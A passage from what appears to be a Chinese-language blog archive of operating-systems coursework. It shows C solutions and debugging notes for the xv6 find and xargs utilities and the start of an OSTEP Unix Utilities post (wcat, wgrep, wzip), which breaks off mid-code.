<ol start="2">
<li>出现 <code>find: cannot open file ./sh</code> ，之后所有文件均打开失败</li>
</ol>
<p>在打印出文件描述符的值后，问题的起因比较明显了。</p>
<p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/fd.png"></p>
<p>文件描述符一直在增大，最终文件打开失败，<code>open</code> 返回 -1。很明显，是因为文件在打开后没有及时关闭，并释放文件描述符，最终文件描述符被全部占用，新的文件无法再被打开。这也解释了既然程序退出后，所有打开的文件会自动关闭，为什么还要建议手动关闭文件的问题。</p>
<ol start="3">
<li>读取到空文件名</li>
</ol>
<p>前面的问题解决之后，我发现程序仍然会出现无限递归搜索的情况（如下图所示），按理说我已经对文件名进行了判断，如果是 <code>.</code> 或者 <code>..</code> 则不做处理。</p>
<p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/recur.png"></p>
<p>尝试打印文件名之后，我发现目录的最后一个文件名为空，这样的空文件名将导致程序不断往其末尾追加斜杠 <code>/</code> 而并没有递归进入该目录中。</p>
<p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/bfg.png"></p>
<p>事实上，使用 <code>read</code> 读取目录时，在读取目录的所有条目之后，会返回一个空的 <code>dirent</code> 结构体，此时 <code>de.name</code> 为空，作为循环结束的标志。其实 <code>user/ls.c</code> 有针对这个特性的判断，不过当时 coding 的时候没有细看。所以正如 Lab guidance 中所说：</p>
<blockquote>
<p>Only when you have a firm grasp of the assignment and solution, then start coding.</p>
</blockquote>
<h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/find.c</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/stat.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/fs.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span>


<span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">file_name</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> path <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span> p <span class="token operator">>=</span> path <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>p <span class="token operator">!=</span> <span class="token string">'/'</span><span class="token punctuation">;</span> <span class="token operator">--</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token operator">++</span>p<span class="token punctuation">;</span>

	<span class="token keyword">return</span> p<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> fd<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">dirent</span> de<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">stat</span> st<span class="token punctuation">;</span>
	<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span><span class="token operator">*</span> name<span class="token punctuation">,</span> <span class="token operator">*</span> p<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: cannot open file %s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fstat</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>st<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: cannot stat file %s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">switch</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">case</span> T_FILE<span class="token operator">:</span>
		name <span class="token operator">=</span> <span class="token function">file_name</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token keyword">case</span> T_DIR<span class="token operator">:</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>de<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>de<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>de<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token comment">// prevent infinite recursion</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>de<span class="token punctuation">.</span>inum <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>

			<span class="token comment">// generate path of sub directory</span>
			<span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>
			p <span class="token operator">=</span> buf <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token operator">*</span>p<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
			<span class="token function">memmove</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> DIRSIZ<span class="token punctuation">)</span><span class="token punctuation">;</span>
			p<span class="token punctuation">[</span>DIRSIZ<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

			<span class="token function">find</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token keyword">default</span><span class="token operator">:</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: argument count error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">find</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>相较于 <code>find</code>，<code>xargs</code> 的实现就简单很多了。由于之前自己实现过一个简单的 shell，因此对于 <code>exec</code> 系统调用还算比较熟悉，本题的主要内容就是根据 <code>argv</code> 和标准输入构造一个新的参数列表，作为指定命令行程序的参数，并使用 <code>exec</code> 来进行调用。</p>
<p>程序的流程比较简单，这里不过多介绍，直接查看完整代码即可。</p>
<h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/xargs.c</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/param.h"</span></span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> i<span class="token punctuation">;</span>
	<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span><span class="token operator">*</span> nargv<span class="token punctuation">[</span>MAXARG<span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> MAXARG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		buf<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// remove last '\n'</span>

		<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			nargv<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		nargv<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>
		nargv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

		<span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">exec</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nargv<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"xargs: fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>操作系统</tag>
        <tag>xv6</tag>
      </tags>
  </entry>
  <entry>
    <title>OSTEP Projects：Unix Utilities</title>
    <url>/2024/05/04/OSTEP%20Projects%EF%BC%9AUnix%20Utilities/</url>
    <content><![CDATA[<p>本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关<a href="https://github.com/remzi-arpacidusseau/ostep-projects">课程项目</a> 的 Unix Utilities 部分，包含个人的代码实现和设计思路。</p>
<span id="more"></span>

<h1 id="wcat"><a href="#wcat" class="headerlink" title="wcat"></a>wcat</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>要实现一个 <code>wcat</code> 命令，打印从文件中读取到的所有字符。</p>
<p>编写一个 for 循环遍历所有的参数（需要读取的文件的路径），打开该文件，依照 README 中的提示使用 <code>fgets()</code> 每次读取一行，并将读取到的字符串打印到标准输出即可。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUF_SIZE</span> <span class="token expression"><span class="token number">1024</span></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wcat: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="wgrep"><a href="#wgrep" class="headerlink" title="wgrep"></a>wgrep</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>要实现一个 <code>wgrep</code> 命令，进行字符串匹配。</p>
<p>根据 README 中的提示，本题测试样例中一行的字符可能会很长，因此建议使用 <code>getline()</code> 这类动态分配内存的函数（无需预先指定缓冲区大小）。这里要求当只有一个参数 <code>term</code> 时，从标准输入中读取字符串，读取方式与从文件中读取一致，区别在于文件流参数的不同：从文件中读取为调用 <code>fopen()</code> 返回的指针，而从标准输入读取为 <code>stdin</code>。</p>
<p>每次读取一行字符串后，需要判断该字符串中是否存在指定的子串 <code>term</code>，这就回到了经典的字符串匹配的问题上。为了代码编写的方便，这里我使用的是最简单的朴素字符串匹配算法，当然也可以使用有限自动机、KMP 算法、Boyer-Moore 算法等更为高效的算法，值得注意的是，Unix 系统的 <code>grep</code> 命令使用的正是 Boyer-Moore 算法。</p>
<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token comment">// 朴素字符串匹配算法</span>
<span class="token keyword">int</span> <span class="token function">match</span><span class="token punctuation">(</span><span class="token keyword">char</span> term<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> m<span class="token punctuation">,</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> m<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">-</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>term<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> buffer<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wgrep: searchterm [file ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">char</span><span class="token operator">*</span> term <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> m <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span><span class="token operator">*</span> buffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token class-name">ssize_t</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	
	<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 从标准输入中读取</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">match</span><span class="token punctuation">(</span>term<span class="token punctuation">,</span> m<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wgrep: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token comment">// 判断字符串是否匹配</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">match</span><span class="token punctuation">(</span>term<span class="token punctuation">,</span> m<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>	
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="wzip"><a href="#wzip" class="headerlink" title="wzip"></a>wzip</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>实现一个简单的压缩命令，将连续重复的字符压缩为 <code>cnt + ch</code>。</p>
<p>算法的逻辑如下：</p>
<ol>
<li>先将 ch 初始化为一个文件中不会出现的字符（例如 <code>&#39;\0&#39;</code>），cnt 初始化为 0. </li>
<li>遍历读取到的每次字符，若与 ch 相同，则将 cnt 加 1；若不同，则使用 <code>fwrite()</code> 写入标准输出，并把 ch 更新为当前字符，cnt 置为 1. 最后，在所有文件遍历完成后，再判断 cnt 是否大于 0，若大于 0，则写入。</li>
</ol>
<p>注意，这里的所有字符均要按照规则进行压缩，包括换行符（<code>&#39;\n&#39;</code>），我最开始写的时候还对换行符进行特判，以此来忽略对其进行处理，属实是多此一举了。</p>
<h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wzip: file1 [file2 ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
